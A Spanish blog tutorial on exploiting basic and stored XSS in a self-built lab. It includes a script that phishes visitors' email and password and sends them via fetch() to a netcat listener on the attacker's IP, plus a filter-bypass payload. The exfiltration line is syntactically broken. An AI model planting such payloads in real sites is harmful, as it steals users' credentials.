---
title: Vunerabilidad XSS
excerpt: Explotación XSS
publishDate: 'Oct 02 2025'
tags:
  - xss
seo:
  image:
    src: '/xss.png'
    alt: Imagen creada con Chat GPT
---

![xss](/xss.png)

***Resumen***: La vulnerabilidad consiste en inyectar código malicioso en una web, pudiendo así almacenarlo para que se ejecute cada vez que el usuario visite una parte de la página, como un comentario o un post en concreto.
En este artículo, vamos a ver la forma básica y la almacenada.

***Nota***: Este laboratorio ha sido creado por y para este post con chatGPT, no utilices esta vulnerabilidad con sitios que no tengas permiso.

***Procedimiento***: Una vez tenemos comprobación de que la web es vulnerable, procedemos a inyectar código malicioso para bien robar credenciales o infectar una máquina.

## XSS Básica

El laboratorio es una web vulnerable, donde vamos a inyectar un código para que nos muestre una alerta en javascript. Para acceder a dicha web solo tienes que decirle a chatGPT que te lo cree y desplegarlo en Docker.

[![laboratorio_xss](/Laboratorio_xss.png)](/Laboratorio_xss.png)

Inyectaremos el siguiente código que debe mostrarnos una alerta por pantalla:

```bash
<script>alert(1)</script>
````
[![crear_alerta](/Crear_alerta.png)](/Crear_alerta.png)

Al entrar en el mensaje tendremos la ejecución del script.

[![1_xss](/1_xss.png)](/1_xss.png)

Con esto ya tenemos XSS básico y una comprobación de que la web es vulnerable.

## XSS almacenado

Vamos a inyectar un código en otro comentario donde nos pida las credenciales y nos las envíe a nuestra máquina donde estaremos escuchando con nuestro querido nc.

```bash
<script>
  var correo = prompt("Introduce tu correo: ");
  var password = prompt("Introduce tu contraseña: ");
  fetch("http://192.168.1.42:4444/ + correo + password);
</script>
````

[![nc_xss](/nc_xss.png)](/nc_xss.png)

Ahora al visitar o recargar el comentario, nos pedirá las credenciales.

[![pide_xss](/pide_xss.png)](/pide_xss.png)

Y vemos como llegan las credenciales.

[![credenciales_xss](/credenciales_xss.png)](/credenciales_xss.png)

## Bypass restricciones

Pero puede que nuestro payload no funcione, bien porque la web está protegida o bien por que determinada palabra esté censurada. Una manera de poder solucionarlo es encerrar la etiqueta anterior entre comillas, así:

```bash
 "><script>alert(1)</script>
 ````
Si existen palabras protegidas que nos impidan ejecutar el payload, solo tenemos que usar otro que facilmente encontraremos por internet. [eventos_xss](https://github.com/payloadbox/xss-payload-list)

[![eventos_xss](/eventos_xss.png)](/eventos_xss.png)











